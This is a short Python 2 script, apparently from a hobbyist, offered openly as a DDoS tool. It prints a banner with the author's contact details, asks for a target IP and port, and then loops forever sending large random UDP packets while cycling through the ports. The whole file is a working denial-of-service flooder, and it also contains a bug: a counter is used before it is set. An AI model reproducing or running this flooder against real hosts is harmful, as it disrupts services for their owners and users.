import sys
import os
import time
import socket
import random
import datetime


############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(40000)
############

os.system("clear")
os.system("figlet Metalic")
time = time.ctime(time.time())
print
print "\033[32;1m|----------------------------------------------|"
print "|\033[32;1m Created   : Jhosua Saut Maruli     |"
print "|\033[32;1m Channel   : youtube.com/c/MrF4K3YT |"
print "|\033[32;1m Gmail     : lucfaker666@gmail.com  |"
print "|\033[32;1m WhatsApp  : 081260032271           |"
print "|\033[32;1m Type      : DDOS                   |"
print "|\033[32;1m Program   : Python                 |"
print "|----------------------------------------------|"
ip = raw_input("IP Target : ")
port = input("Port    : ")
    
    
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "\033[31;1m Mengirim \033[33;1m'%s paket ke %s \033[35;1mPort:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
